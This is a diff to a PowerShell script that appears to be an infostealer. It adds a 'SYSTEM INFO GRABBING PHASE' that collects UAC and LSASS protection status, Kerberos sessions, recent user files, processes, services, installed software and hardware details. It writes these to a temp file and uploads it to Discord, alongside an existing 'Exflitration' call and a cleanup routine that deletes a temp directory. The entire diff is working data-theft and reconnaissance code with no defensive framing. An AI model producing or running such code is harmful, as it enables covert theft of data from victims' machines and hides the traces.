@@ -16,6 +16,14 @@ function TempDir {
     }
 }
 
+# Function to delete the temporary directory
+function DelTempDir {
+    cd C:\
+    rmdir -R \temp
+    exit
+}
+
+
 function Upload-Discord {
     [CmdletBinding()]
     param (
@@ -128,9 +136,153 @@ function DelTempDir {
     exit
 }
 
+<#
+
+############################################################################################################################################################
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+SYSTEM INFO GRABBING PHASE
+------------------------------------------------------------------------------------------------------------------------------------------------------------
+############################################################################################################################################################
+
+#>
+Function SystemInfoGrabbing {
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Function to retrieve a registry value
+Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Registry key and value names
+$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
+$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
+$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get registry values
+$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
+$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Evaluate UAC settings
+If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notify" }
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Notify me only when apps try to make changes to my computer (do not dim my desktop)" } 
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Notify me only when apps try to make changes to my computer (default)" }
+ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notify" }
+Else{ $UAC = "Unknown" } 
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Check if LSASS is running as a protected process
+$lsass = Get-Process -Name "lsass"
+if ($lsass.ProtectedProcess) {$lsassStatus = "LSASS is running as a protected process."} 
+else {$lsassStatus = "LSASS is not running as a protected process."}
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get names of items in the Startup folder
+$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get System Information
+$computerSystem = Get-CimInstance CIM_ComputerSystem
+$computerName = $computerSystem.Name
+$computerModel = $computerSystem.Model
+$computerManufacturer = $computerSystem.Manufacturer
+$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
+$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
+$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
+$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
+$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
+$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get a list of Scheduled Tasks
+$ScheduledTasks = Get-ScheduledTask
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get Kerberos ticket information
+$klist = klist sessions
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get a list of 50 most recent files in the user's profile
+$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get COM & Serial Devices
+$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get a list of processes
+$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get a list of services
+$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get a list of installed software
+$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get a list of drivers
+$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Get information about the video card
+$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+# Output to a text file
+$outputPath = Join-Path $env:TEMP "SystemInfo.txt"
+@(
+    "UAC Setting: $UAC",
+    "LSASS Status: $lsassStatus",
+    "Startup Items: $StartUp",
+    "System Information:",
+    "    Computer Name: $computerName",
+    "    Model: $computerModel",
+    "    Manufacturer: $computerManufacturer",
+    "    BIOS: $computerBIOS",
+    "    OS: $computerOs",
+    "    CPU: $computerCpu",
+    "    Mainboard: $computerMainboard",
+    "    RAM Capacity: $computerRamCapacity",
+    "    RAM: $computerRam",
+    "Scheduled Tasks: $ScheduledTasks",
+    "Kerberos Tickets: $klist",
+    "Recent Files: $RecentFiles",
+    "COM & Serial Devices: $COMDevices",
+    "Processes: $process",
+    "Services: $service",
+    "Installed Software: $software",
+    "Drivers: $drivers",
+    "Video Card Information: $videocard"
+) | Out-File -FilePath $outputPath
+
+    # Upload to Discord
+    Upload-Discord -file $outputPath -text "System information uploaded by $env:username at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
+}
 
 #Call Exflitration
 Exflitration
+
+#Call SystemInfoGrabbing
+SystemInfoGrabbing
 
 #Call DelTempDir
 DelTempDir
